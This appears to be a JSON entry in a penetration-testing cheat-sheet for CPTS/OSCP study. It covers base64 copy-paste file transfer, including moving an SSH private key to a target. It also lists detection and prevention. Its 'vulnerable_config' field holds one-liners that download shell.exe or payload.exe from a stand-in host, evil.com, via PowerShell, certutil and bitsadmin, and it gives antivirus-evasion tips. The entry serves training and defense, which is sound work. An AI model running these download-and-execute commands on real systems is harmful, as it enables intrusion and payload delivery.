@@ -1,0 +1,100 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "base64",
+    "powershell"
+  ],
+  "tags": [
+    "base64",
+    "copy-paste",
+    "transfer"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Base64",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Encode a key on Linux to copy the text",
+      "command": "cat id_rsa | base64 -w 0; echo"
+    },
+    {
+      "label": "Rebuild it on Windows from the pasted string",
+      "command": "[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"<paste-base64-here>\"))"
+    }
+  ],
+  "notes": "Always compare md5/Get-FileHash on both ends - terminals can silently drop characters on large blobs.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "netcat-transfer",
+      "rel": "alternative",
+      "note": "Raw nc pipe for bigger files."
+    },
+    {
+      "id": "code-download-oneliners",
+      "rel": "alternative",
+      "note": "Interpreter one-liners."
+    },
+    {
+      "id": "cdsa-m11-js-encoding",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "base64-transfer",
+  "name": "Base64 - Copy/Paste Transfer",
+  "command": "cat id_rsa | base64 -w 0; echo",
+  "description": "When you only have a shell (no network transfer), base64-encode a file, copy the text across, and decode on the other side. Verify with a hash so nothing was truncated.",
+  "variations": [
+    {
+      "label": "Linux -> Windows",
+      "command": "# linux: cat id_rsa | base64 -w 0; echo ; md5sum id_rsa\n# windows: [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"<base64>\"))\nGet-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5"
+    },
+    {
+      "label": "Windows -> Linux",
+      "command": "# windows: [Convert]::ToBase64String((Get-Content -Path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\nGet-FileHash \"C:\\...\\hosts\" -Algorithm MD5\n# linux: echo <base64> | base64 -d > hosts ; md5sum hosts"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "When no network file transfer is possible, a file is base64-encoded, the string pasted over an existing shell, and decoded on the target (base64 -d / [Convert]::FromBase64String) - moving the file with zero separate network connection.",
+    "prerequisites": "An existing interactive shell on the target and the base64 utility (native on Linux; PowerShell on Windows).",
+    "impact": "A file reconstructed on the target without any download tool or new network flow - bypasses egress controls entirely.",
+    "detection": "No network transfer to catch; detection shifts to the shell/command line - a very long base64 string echoed and piped to base64 -d, or [Convert]::FromBase64String in PowerShell (4104), plus the new file on disk.",
+    "artifacts": "A large base64 blob in shell history / 4104 logs; the decoded file on disk; no network artifact.",
+    "prevention": "Command-line and script-block logging to catch large base64 decode operations; file-integrity monitoring for new executables; EDR on the reconstructed file's execution.",
+    "evasion": "This IS an evasion of network controls; splitting the blob and integrity-checking with md5sum avoids corruption, and decoding to a non-flagged path reduces AV attention.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
